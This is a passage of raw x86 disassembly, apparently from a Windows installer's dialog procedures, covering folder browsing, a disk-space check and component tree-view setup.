  40420b:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404212:	75 72                	jne    0x404286
  404214:	8b 7d 08             	mov    0x8(%ebp),%edi
  404217:	53                   	push   %ebx
  404218:	57                   	push   %edi
  404219:	ff 15 2c 72 40 00    	call   *0x40722c
  40421f:	56                   	push   %esi
  404220:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404223:	e8 15 13 00 00       	call   0x40553d
  404228:	85 c0                	test   %eax,%eax
  40422a:	74 10                	je     0x40423c
  40422c:	56                   	push   %esi
  40422d:	e8 32 13 00 00       	call   0x405564
  404232:	85 c0                	test   %eax,%eax
  404234:	75 06                	jne    0x40423c
  404236:	56                   	push   %esi
  404237:	e8 94 12 00 00       	call   0x4054d0
  40423c:	56                   	push   %esi
  40423d:	89 3d 58 36 42 00    	mov    %edi,0x423658
  404243:	ff 75 f8             	push   -0x8(%ebp)
  404246:	ff 15 f4 71 40 00    	call   *0x4071f4
  40424c:	8b 45 14             	mov    0x14(%ebp),%eax
  40424f:	ff 70 34             	push   0x34(%eax)
  404252:	6a 01                	push   $0x1
  404254:	57                   	push   %edi
  404255:	e8 35 fb ff ff       	call   0x403d8f
  40425a:	8b 45 14             	mov    0x14(%ebp),%eax
  40425d:	ff 70 30             	push   0x30(%eax)
  404260:	6a 14                	push   $0x14
  404262:	57                   	push   %edi
  404263:	e8 27 fb ff ff       	call   0x403d8f
  404268:	ff 75 f8             	push   -0x8(%ebp)
  40426b:	e8 54 fb ff ff       	call   0x403dc4
  404270:	6a 07                	push   $0x7
  404272:	e8 88 1a 00 00       	call   0x405cff
  404277:	85 c0                	test   %eax,%eax
  404279:	0f 84 6e 02 00 00    	je     0x4044ed
  40427f:	6a 01                	push   $0x1
  404281:	ff 75 f8             	push   -0x8(%ebp)
  404284:	ff d0                	call   *%eax
  404286:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40428d:	0f 85 cf 00 00 00    	jne    0x404362
  404293:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404297:	3b c3                	cmp    %ebx,%eax
  404299:	75 18                	jne    0x4042b3
  40429b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40429e:	c1 e9 10             	shr    $0x10,%ecx
  4042a1:	66 81 f9 00 03       	cmp    $0x300,%cx
  4042a6:	0f 85 41 02 00 00    	jne    0x4044ed
  4042ac:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4042b3:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  4042b8:	0f 85 a4 00 00 00    	jne    0x404362
  4042be:	6a 07                	push   $0x7
  4042c0:	33 c0                	xor    %eax,%eax
  4042c2:	59                   	pop    %ecx
  4042c3:	8d 7d bc             	lea    -0x44(%ebp),%edi
  4042c6:	ff 75 fc             	push   -0x4(%ebp)
  4042c9:	f3 ab                	rep stos %eax,%es:(%edi)
  4042cb:	8b 45 08             	mov    0x8(%ebp),%eax
  4042ce:	bf 78 04 42 00       	mov    $0x420478,%edi
  4042d3:	68 48 f8 41 00       	push   $0x41f848
  4042d8:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4042db:	89 7d c0             	mov    %edi,-0x40(%ebp)
  4042de:	c7 45 cc 02 45 40 00 	movl   $0x404502,-0x34(%ebp)
  4042e5:	89 75 d0             	mov    %esi,-0x30(%ebp)
  4042e8:	e8 12 17 00 00       	call   0x4059ff
  4042ed:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4042f0:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4042f3:	50                   	push   %eax
  4042f4:	c7 45 c8 41 00 00 00 	movl   $0x41,-0x38(%ebp)
  4042fb:	ff 15 54 71 40 00    	call   *0x407154
  404301:	85 c0                	test   %eax,%eax
  404303:	74 56                	je     0x40435b
  404305:	50                   	push   %eax
  404306:	ff 15 78 72 40 00    	call   *0x407278
  40430c:	56                   	push   %esi
  40430d:	e8 be 11 00 00       	call   0x4054d0
  404312:	a1 90 3e 42 00       	mov    0x423e90,%eax
  404317:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  40431d:	85 c0                	test   %eax,%eax
  40431f:	74 28                	je     0x404349
  404321:	81 fe 00 94 42 00    	cmp    $0x429400,%esi
  404327:	75 20                	jne    0x404349
  404329:	50                   	push   %eax
  40432a:	6a 00                	push   $0x0
  40432c:	e8 ce 16 00 00       	call   0x4059ff
  404331:	57                   	push   %edi
  404332:	bf 20 2e 42 00       	mov    $0x422e20,%edi
  404337:	57                   	push   %edi
  404338:	ff 15 f0 70 40 00    	call   *0x4070f0
  40433e:	85 c0                	test   %eax,%eax
  404340:	74 07                	je     0x404349
  404342:	57                   	push   %edi
  404343:	56                   	push   %esi
  404344:	e8 b0 16 00 00       	call   0x4059f9
  404349:	ff 05 64 04 42 00    	incl   0x420464
  40434f:	56                   	push   %esi
  404350:	53                   	push   %ebx
  404351:	ff 75 08             	push   0x8(%ebp)
  404354:	e8 23 0f 00 00       	call   0x40527c
  404359:	eb 07                	jmp    0x404362
  40435b:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404362:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404369:	74 0d                	je     0x404378
  40436b:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404372:	0f 85 75 01 00 00    	jne    0x4044ed
  404378:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40437c:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404380:	56                   	push   %esi
  404381:	53                   	push   %ebx
  404382:	e8 fb 0e 00 00       	call   0x405282
  404387:	56                   	push   %esi
  404388:	e8 24 12 00 00       	call   0x4055b1
  40438d:	85 c0                	test   %eax,%eax
  40438f:	75 07                	jne    0x404398
  404391:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404398:	bf 40 f4 41 00       	mov    $0x41f440,%edi
  40439d:	56                   	push   %esi
  40439e:	57                   	push   %edi
  40439f:	e8 39 16 00 00       	call   0x4059dd
  4043a4:	33 db                	xor    %ebx,%ebx
  4043a6:	53                   	push   %ebx
  4043a7:	e8 53 19 00 00       	call   0x405cff
  4043ac:	3b c3                	cmp    %ebx,%eax
  4043ae:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4043b1:	74 35                	je     0x4043e8
  4043b3:	33 c0                	xor    %eax,%eax
  4043b5:	3b c7                	cmp    %edi,%eax
  4043b7:	74 2d                	je     0x4043e6
  4043b9:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4043bc:	50                   	push   %eax
  4043bd:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4043c0:	50                   	push   %eax
  4043c1:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4043c4:	50                   	push   %eax
  4043c5:	57                   	push   %edi
  4043c6:	ff 55 f4             	call   *-0xc(%ebp)
  4043c9:	85 c0                	test   %eax,%eax
  4043cb:	75 6c                	jne    0x404439
  4043cd:	85 db                	test   %ebx,%ebx
  4043cf:	74 03                	je     0x4043d4
  4043d1:	66 21 03             	and    %ax,(%ebx)
  4043d4:	57                   	push   %edi
  4043d5:	e8 3d 11 00 00       	call   0x405517
  4043da:	8b d8                	mov    %eax,%ebx
  4043dc:	4b                   	dec    %ebx
  4043dd:	3b df                	cmp    %edi,%ebx
  4043df:	66 c7 03 5c 00       	movw   $0x5c,(%ebx)
  4043e4:	75 d3                	jne    0x4043b9
  4043e6:	33 db                	xor    %ebx,%ebx
  4043e8:	56                   	push   %esi
  4043e9:	57                   	push   %edi
  4043ea:	e8 ee 15 00 00       	call   0x4059dd
  4043ef:	57                   	push   %edi
  4043f0:	e8 6f 11 00 00       	call   0x405564
  4043f5:	3b c3                	cmp    %ebx,%eax
  4043f7:	74 03                	je     0x4043fc
  4043f9:	80 20 00             	andb   $0x0,(%eax)
  4043fc:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4043ff:	50                   	push   %eax
  404400:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404403:	50                   	push   %eax
  404404:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404407:	50                   	push   %eax
  404408:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40440b:	50                   	push   %eax
  40440c:	57                   	push   %edi
  40440d:	ff 15 bc 70 40 00    	call   *0x4070bc
  404413:	85 c0                	test   %eax,%eax
  404415:	74 3a                	je     0x404451
  404417:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40441a:	be 00 04 00 00       	mov    $0x400,%esi
  40441f:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  404423:	56                   	push   %esi
  404424:	ff 75 f4             	push   -0xc(%ebp)
  404427:	50                   	push   %eax
  404428:	ff 15 30 71 40 00    	call   *0x407130
  40442e:	8b f8                	mov    %eax,%edi
  404430:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404437:	eb 20                	jmp    0x404459
  404439:	8b 7d d8             	mov    -0x28(%ebp),%edi
  40443c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40443f:	0f ac c7 0a          	shrd   $0xa,%eax,%edi
  404443:	c1 e8 0a             	shr    $0xa,%eax
  404446:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40444d:	33 db                	xor    %ebx,%ebx
  40444f:	eb 03                	jmp    0x404454
  404451:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404454:	be 00 04 00 00       	mov    $0x400,%esi
  404459:	6a 05                	push   $0x5
  40445b:	e8 bd 01 00 00       	call   0x40461d
  404460:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  404463:	74 0b                	je     0x404470
  404465:	3b f8                	cmp    %eax,%edi
  404467:	73 07                	jae    0x404470
  404469:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404470:	8b 0d 5c 36 42 00    	mov    0x42365c,%ecx
  404476:	39 59 10             	cmp    %ebx,0x10(%ecx)
  404479:	74 2b                	je     0x4044a6
  40447b:	50                   	push   %eax
  40447c:	6a fb                	push   $0xfffffffb
  40447e:	68 ff 03 00 00       	push   $0x3ff
  404483:	e8 e0 00 00 00       	call   0x404568
  404488:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40448b:	74 0b                	je     0x404498
  40448d:	57                   	push   %edi
  40448e:	6a fc                	push   $0xfffffffc
  404490:	56                   	push   %esi
  404491:	e8 d2 00 00 00       	call   0x404568
  404496:	eb 0e                	jmp    0x4044a6
  404498:	68 30 f4 41 00       	push   $0x41f430
  40449d:	56                   	push   %esi
  40449e:	ff 75 08             	push   0x8(%ebp)
  4044a1:	e8 d6 0d 00 00       	call   0x40527c
  4044a6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044a9:	3b c3                	cmp    %ebx,%eax
  4044ab:	a3 24 3f 42 00       	mov    %eax,0x423f24
  4044b0:	75 0a                	jne    0x4044bc
  4044b2:	6a 07                	push   $0x7
  4044b4:	e8 52 cf ff ff       	call   0x40140b
  4044b9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4044bc:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4044bf:	85 70 14             	test   %esi,0x14(%eax)
  4044c2:	74 03                	je     0x4044c7
  4044c4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4044c7:	33 c0                	xor    %eax,%eax
  4044c9:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  4044cc:	0f 94 c0             	sete   %al
  4044cf:	50                   	push   %eax
  4044d0:	e8 dc f8 ff ff       	call   0x403db1
  4044d5:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  4044d8:	75 0d                	jne    0x4044e7
  4044da:	39 1d 64 04 42 00    	cmp    %ebx,0x420464
  4044e0:	75 05                	jne    0x4044e7
  4044e2:	e8 7b fc ff ff       	call   0x404162
  4044e7:	89 1d 64 04 42 00    	mov    %ebx,0x420464
  4044ed:	ff 75 14             	push   0x14(%ebp)
  4044f0:	ff 75 10             	push   0x10(%ebp)
  4044f3:	ff 75 0c             	push   0xc(%ebp)
  4044f6:	e8 fb f8 ff ff       	call   0x403df6
  4044fb:	5f                   	pop    %edi
  4044fc:	5e                   	pop    %esi
  4044fd:	5b                   	pop    %ebx
  4044fe:	c9                   	leave
  4044ff:	c2 10 00             	ret    $0x10
  404502:	55                   	push   %ebp
  404503:	8b ec                	mov    %esp,%ebp
  404505:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404509:	56                   	push   %esi
  40450a:	8b 35 44 72 40 00    	mov    0x407244,%esi
  404510:	75 1c                	jne    0x40452e
  404512:	ff 75 14             	push   0x14(%ebp)
  404515:	68 fb 03 00 00       	push   $0x3fb
  40451a:	e8 63 0d 00 00       	call   0x405282
  40451f:	ff 75 14             	push   0x14(%ebp)
  404522:	6a 01                	push   $0x1
  404524:	68 66 04 00 00       	push   $0x466
  404529:	ff 75 08             	push   0x8(%ebp)
  40452c:	ff d6                	call   *%esi
  40452e:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404532:	75 2d                	jne    0x404561
  404534:	ff 75 14             	push   0x14(%ebp)
  404537:	ff 75 10             	push   0x10(%ebp)
  40453a:	ff 15 50 71 40 00    	call   *0x407150
  404540:	85 c0                	test   %eax,%eax
  404542:	74 0e                	je     0x404552
  404544:	6a 07                	push   $0x7
  404546:	e8 c0 ce ff ff       	call   0x40140b
  40454b:	85 c0                	test   %eax,%eax
  40454d:	75 03                	jne    0x404552
  40454f:	40                   	inc    %eax
  404550:	eb 02                	jmp    0x404554
  404552:	33 c0                	xor    %eax,%eax
  404554:	50                   	push   %eax
  404555:	6a 00                	push   $0x0
  404557:	68 65 04 00 00       	push   $0x465
  40455c:	ff 75 08             	push   0x8(%ebp)
  40455f:	ff d6                	call   *%esi
  404561:	33 c0                	xor    %eax,%eax
  404563:	5e                   	pop    %esi
  404564:	5d                   	pop    %ebp
  404565:	c2 10 00             	ret    $0x10
  404568:	55                   	push   %ebp
  404569:	8b ec                	mov    %esp,%ebp
  40456b:	83 ec 40             	sub    $0x40,%esp
  40456e:	53                   	push   %ebx
  40456f:	56                   	push   %esi
  404570:	8b 75 10             	mov    0x10(%ebp),%esi
  404573:	57                   	push   %edi
  404574:	6a 14                	push   $0x14
  404576:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  40457c:	5f                   	pop    %edi
  40457d:	6a dc                	push   $0xffffffdc
  40457f:	5b                   	pop    %ebx
  404580:	73 06                	jae    0x404588
  404582:	6a 0a                	push   $0xa
  404584:	5f                   	pop    %edi
  404585:	6a dd                	push   $0xffffffdd
  404587:	5b                   	pop    %ebx
  404588:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  40458e:	73 05                	jae    0x404595
  404590:	6a de                	push   $0xffffffde
  404592:	33 ff                	xor    %edi,%edi
  404594:	5b                   	pop    %ebx
  404595:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  40459b:	73 0f                	jae    0x4045ac
  40459d:	33 c0                	xor    %eax,%eax
  40459f:	8b cf                	mov    %edi,%ecx
  4045a1:	40                   	inc    %eax
  4045a2:	6a 14                	push   $0x14
  4045a4:	d3 e0                	shl    %cl,%eax
  4045a6:	59                   	pop    %ecx
  4045a7:	99                   	cltd
  4045a8:	f7 f9                	idiv   %ecx
  4045aa:	03 f0                	add    %eax,%esi
  4045ac:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4045af:	6a df                	push   $0xffffffdf
  4045b1:	50                   	push   %eax
  4045b2:	e8 48 14 00 00       	call   0x4059ff
  4045b7:	50                   	push   %eax
  4045b8:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4045bb:	53                   	push   %ebx
  4045bc:	50                   	push   %eax
  4045bd:	e8 3d 14 00 00       	call   0x4059ff
  4045c2:	50                   	push   %eax
  4045c3:	8b c6                	mov    %esi,%eax
  4045c5:	25 ff ff ff 00       	and    $0xffffff,%eax
  4045ca:	8b cf                	mov    %edi,%ecx
  4045cc:	6a 0a                	push   $0xa
  4045ce:	33 d2                	xor    %edx,%edx
  4045d0:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4045d3:	03 c0                	add    %eax,%eax
  4045d5:	d3 e8                	shr    %cl,%eax
  4045d7:	59                   	pop    %ecx
  4045d8:	f7 f1                	div    %ecx
  4045da:	8b cf                	mov    %edi,%ecx
  4045dc:	d3 ee                	shr    %cl,%esi
  4045de:	52                   	push   %edx
  4045df:	56                   	push   %esi
  4045e0:	68 cc 91 40 00       	push   $0x4091cc
  4045e5:	be 78 04 42 00       	mov    $0x420478,%esi
  4045ea:	ff 75 0c             	push   0xc(%ebp)
  4045ed:	56                   	push   %esi
  4045ee:	e8 0c 14 00 00       	call   0x4059ff
  4045f3:	56                   	push   %esi
  4045f4:	8b f8                	mov    %eax,%edi
  4045f6:	e8 f8 13 00 00       	call   0x4059f3
  4045fb:	03 f8                	add    %eax,%edi
  4045fd:	57                   	push   %edi
  4045fe:	ff 15 00 72 40 00    	call   *0x407200
  404604:	83 c4 18             	add    $0x18,%esp
  404607:	56                   	push   %esi
  404608:	ff 75 08             	push   0x8(%ebp)
  40460b:	ff 35 58 36 42 00    	push   0x423658
  404611:	e8 66 0c 00 00       	call   0x40527c
  404616:	5f                   	pop    %edi
  404617:	5e                   	pop    %esi
  404618:	5b                   	pop    %ebx
  404619:	c9                   	leave
  40461a:	c2 0c 00             	ret    $0xc
  40461d:	8b 15 ac 3e 42 00    	mov    0x423eac,%edx
  404623:	8b 0d a8 3e 42 00    	mov    0x423ea8,%ecx
  404629:	33 c0                	xor    %eax,%eax
  40462b:	85 d2                	test   %edx,%edx
  40462d:	74 18                	je     0x404647
  40462f:	56                   	push   %esi
  404630:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404634:	74 07                	je     0x40463d
  404636:	8b 74 24 08          	mov    0x8(%esp),%esi
  40463a:	03 04 b1             	add    (%ecx,%esi,4),%eax
  40463d:	81 c1 18 04 00 00    	add    $0x418,%ecx
  404643:	4a                   	dec    %edx
  404644:	75 ea                	jne    0x404630
  404646:	5e                   	pop    %esi
  404647:	c2 04 00             	ret    $0x4
  40464a:	55                   	push   %ebp
  40464b:	8b ec                	mov    %esp,%ebp
  40464d:	83 ec 38             	sub    $0x38,%esp
  404650:	56                   	push   %esi
  404651:	8b 35 44 72 40 00    	mov    0x407244,%esi
  404657:	57                   	push   %edi
  404658:	8b 7d 08             	mov    0x8(%ebp),%edi
  40465b:	6a 00                	push   $0x0
  40465d:	6a 09                	push   $0x9
  40465f:	68 0a 11 00 00       	push   $0x110a
  404664:	57                   	push   %edi
  404665:	ff d6                	call   *%esi
  404667:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40466b:	74 3c                	je     0x4046a9
  40466d:	ff 15 a0 71 40 00    	call   *0x4071a0
  404673:	0f bf c8             	movswl %ax,%ecx
  404676:	c1 e8 10             	shr    $0x10,%eax
  404679:	0f bf c0             	movswl %ax,%eax
  40467c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40467f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404682:	50                   	push   %eax
  404683:	57                   	push   %edi
  404684:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404687:	ff 15 70 71 40 00    	call   *0x407170
  40468d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404690:	50                   	push   %eax
  404691:	6a 00                	push   $0x0
  404693:	68 11 11 00 00       	push   $0x1111
  404698:	57                   	push   %edi
  404699:	ff d6                	call   *%esi
  40469b:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  40469f:	75 05                	jne    0x4046a6
  4046a1:	83 c8 ff             	or     $0xffffffff,%eax
  4046a4:	eb 1e                	jmp    0x4046c4
  4046a6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4046a9:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4046ac:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4046af:	50                   	push   %eax
  4046b0:	6a 00                	push   $0x0
  4046b2:	68 0c 11 00 00       	push   $0x110c
  4046b7:	57                   	push   %edi
  4046b8:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  4046bf:	ff d6                	call   *%esi
  4046c1:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4046c4:	5f                   	pop    %edi
  4046c5:	5e                   	pop    %esi
  4046c6:	c9                   	leave
  4046c7:	c2 08 00             	ret    $0x8
  4046ca:	55                   	push   %ebp
  4046cb:	8b ec                	mov    %esp,%ebp
  4046cd:	83 ec 50             	sub    $0x50,%esp
  4046d0:	53                   	push   %ebx
  4046d1:	56                   	push   %esi
  4046d2:	8b 35 2c 72 40 00    	mov    0x40722c,%esi
  4046d8:	57                   	push   %edi
  4046d9:	68 f9 03 00 00       	push   $0x3f9
  4046de:	ff 75 08             	push   0x8(%ebp)
  4046e1:	ff d6                	call   *%esi
  4046e3:	68 08 04 00 00       	push   $0x408
  4046e8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4046eb:	ff 75 08             	push   0x8(%ebp)
  4046ee:	ff d6                	call   *%esi
  4046f0:	8b 1d a8 3e 42 00    	mov    0x423ea8,%ebx
  4046f6:	8b 35 44 72 40 00    	mov    0x407244,%esi
  4046fc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4046ff:	a1 90 3e 42 00       	mov    0x423e90,%eax
  404704:	05 94 00 00 00       	add    $0x94,%eax
  404709:	33 ff                	xor    %edi,%edi
  40470b:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404712:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  404715:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404718:	0f 85 22 02 00 00    	jne    0x404940
  40471e:	8b 45 08             	mov    0x8(%ebp),%eax
  404721:	6a 02                	push   $0x2
  404723:	a3 e0 3e 42 00       	mov    %eax,0x423ee0
  404728:	a1 ac 3e 42 00       	mov    0x423eac,%eax
  40472d:	5b                   	pop    %ebx
  40472e:	89 7d e8             	mov    %edi,-0x18(%ebp)
  404731:	c1 e0 02             	shl    $0x2,%eax
  404734:	50                   	push   %eax
  404735:	6a 40                	push   $0x40
  404737:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40473a:	ff 15 00 71 40 00    	call   *0x407100
  404740:	6a 6e                	push   $0x6e
  404742:	a3 6c 04 42 00       	mov    %eax,0x42046c
  404747:	ff 35 80 3e 42 00    	push   0x423e80
  40474d:	ff 15 a4 71 40 00    	call   *0x4071a4
  404753:	83 0d 60 04 42 00 ff 	orl    $0xffffffff,0x420460
  40475a:	68 cb 4c 40 00       	push   $0x404ccb
  40475f:	6a fc                	push   $0xfffffffc
  404761:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404764:	ff 75 fc             	push   -0x4(%ebp)
  404767:	ff 15 30 72 40 00    	call   *0x407230
  40476d:	57                   	push   %edi
  40476e:	6a 06                	push   $0x6
  404770:	6a 21                	push   $0x21
  404772:	6a 10                	push   $0x10
  404774:	6a 10                	push   $0x10
  404776:	a3 68 04 42 00       	mov    %eax,0x420468
  40477b:	ff 15 34 70 40 00    	call   *0x407034
  404781:	68 ff 00 ff 00       	push   $0xff00ff
  404786:	a3 54 04 42 00       	mov    %eax,0x420454
  40478b:	ff 75 ec             	push   -0x14(%ebp)
  40478e:	50                   	push   %eax
  40478f:	ff 15 28 70 40 00    	call   *0x407028
  404795:	ff 35 54 04 42 00    	push   0x420454
  40479b:	53                   	push   %ebx
  40479c:	68 09 11 00 00       	push   $0x1109
  4047a1:	ff 75 fc             	push   -0x4(%ebp)
  4047a4:	ff d6                	call   *%esi
  4047a6:	57                   	push   %edi
  4047a7:	57                   	push   %edi
  4047a8:	68 1c 11 00 00       	push   $0x111c
  4047ad:	ff 75 fc             	push   -0x4(%ebp)
  4047b0:	ff d6                	call   *%esi
  4047b2:	83 f8 10             	cmp    $0x10,%eax
  4047b5:	7d 0d                	jge    0x4047c4
  4047b7:	57                   	push   %edi
  4047b8:	6a 10                	push   $0x10
  4047ba:	68 1b 11 00 00       	push   $0x111b
  4047bf:	ff 75 fc             	push   -0x4(%ebp)
  4047c2:	ff d6                	call   *%esi
  4047c4:	ff 75 ec             	push   -0x14(%ebp)
  4047c7:	ff 15 44 70 40 00    	call   *0x407044
  4047cd:	33 db                	xor    %ebx,%ebx
  4047cf:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4047d2:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  4047d5:	3b c7                	cmp    %edi,%eax
  4047d7:	74 27                	je     0x404800
  4047d9:	83 fb 20             	cmp    $0x20,%ebx
  4047dc:	74 03                	je     0x4047e1
  4047de:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4047e1:	50                   	push   %eax
  4047e2:	57                   	push   %edi
  4047e3:	e8 17 12 00 00       	call   0x4059ff
  4047e8:	50                   	push   %eax
  4047e9:	57                   	push   %edi
  4047ea:	68 43 01 00 00       	push   $0x143
  4047ef:	ff 75 f8             	push   -0x8(%ebp)
  4047f2:	ff d6                	call   *%esi
  4047f4:	53                   	push   %ebx
  4047f5:	50                   	push   %eax
  4047f6:	68 51 01 00 00       	push   $0x151
  4047fb:	ff 75 f8             	push   -0x8(%ebp)
  4047fe:	ff d6                	call   *%esi
  404800:	43                   	inc    %ebx
  404801:	83 fb 21             	cmp    $0x21,%ebx
  404804:	7c c9                	jl     0x4047cf
  404806:	8b 7d 14             	mov    0x14(%ebp),%edi
  404809:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  40480c:	ff 74 9f 30          	push   0x30(%edi,%ebx,4)
  404810:	6a 15                	push   $0x15
  404812:	ff 75 08             	push   0x8(%ebp)
  404815:	e8 75 f5 ff ff       	call   0x403d8f
  40481a:	ff 74 9f 34          	push   0x34(%edi,%ebx,4)
  40481e:	6a 16                	push   $0x16
  404820:	ff 75 08             	push   0x8(%ebp)
  404823:	e8 67 f5 ff ff       	call   0x403d8f
  404828:	33 ff                	xor    %edi,%edi
  40482a:	33 db                	xor    %ebx,%ebx
  40482c:	39 3d ac 3e 42 00    	cmp    %edi,0x423eac
  404832:	0f 8e c4 00 00 00    	jle    0x4048fc
  404838:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40483b:	8d 50 08             	lea    0x8(%eax),%edx
  40483e:	89 55 ec             	mov    %edx,-0x14(%ebp)
  404841:	8d 42 10             	lea    0x10(%edx),%eax
  404844:	80 38 00             	cmpb   $0x0,(%eax)
  404847:	0f 84 90 00 00 00    	je     0x4048dd
  40484d:	89 45 c8             	mov    %eax,-0x38(%ebp)
  404850:	8b 02                	mov    (%edx),%eax
  404852:	6a 20                	push   $0x20
  404854:	8b d0                	mov    %eax,%edx
  404856:	59                   	pop    %ecx
  404857:	89 5d b0             	mov    %ebx,-0x50(%ebp)
  40485a:	23 d1                	and    %ecx,%edx
  40485c:	c7 45 b4 02 00 ff ff 	movl   $0xffff0002,-0x4c(%ebp)
  404863:	a8 02                	test   $0x2,%al
  404865:	c7 45 b8 0d 00 00 00 	movl   $0xd,-0x48(%ebp)
  40486c:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  40486f:	89 7d dc             	mov    %edi,-0x24(%ebp)
  404872:	89 55 c0             	mov    %edx,-0x40(%ebp)
  404875:	74 38                	je     0x4048af
  404877:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40487a:	c7 45 b8 4d 00 00 00 	movl   $0x4d,-0x48(%ebp)
  404881:	50                   	push   %eax
  404882:	6a 00                	push   $0x0
  404884:	68 00 11 00 00       	push   $0x1100
  404889:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  404890:	ff 75 fc             	push   -0x4(%ebp)
  404893:	ff d6                	call   *%esi
  404895:	8b 0d 6c 04 42 00    	mov    0x42046c,%ecx
  40489b:	c7 45 e8 01 00 00 00 	movl   $0x1,-0x18(%ebp)
  4048a2:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  4048a5:	a1 6c 04 42 00       	mov    0x42046c,%eax
  4048aa:	8b 1c b8             	mov    (%eax,%edi,4),%ebx
  4048ad:	eb 2e                	jmp    0x4048dd
  4048af:	a8 04                	test   $0x4,%al
  4048b1:	74 11                	je     0x4048c4
  4048b3:	53                   	push   %ebx
  4048b4:	6a 03                	push   $0x3
  4048b6:	68 0a 11 00 00       	push   $0x110a
  4048bb:	ff 75 fc             	push   -0x4(%ebp)
  4048be:	ff d6                	call   *%esi
  4048c0:	8b d8                	mov    %eax,%ebx
  4048c2:	eb 19                	jmp    0x4048dd
  4048c4:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4048c7:	50                   	push   %eax
  4048c8:	6a 00                	push   $0x0
  4048ca:	68 00 11 00 00       	push   $0x1100
  4048cf:	ff 75 fc             	push   -0x4(%ebp)
  4048d2:	ff d6                	call   *%esi
  4048d4:	8b 0d 6c 04 42 00    	mov    0x42046c,%ecx
  4048da:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  4048dd:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4048e0:	47                   	inc    %edi
  4048e1:	81 c2 18 04 00 00    	add    $0x418,%edx
  4048e7:	3b 3d ac 3e 42 00    	cmp    0x423eac,%edi
  4048ed:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4048f0:	0f 8c 4b ff ff ff    	jl     0x404841
  4048f6:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4048fa:	75 19                	jne    0x404915
  4048fc:	6a f0                	push   $0xfffffff0
  4048fe:	ff 75 fc             	push   -0x4(%ebp)
  404901:	ff 15 90 71 40 00    	call   *0x407190
  404907:	24 fb                	and    $0xfb,%al
  404909:	50                   	push   %eax
  40490a:	6a f0                	push   $0xfffffff0
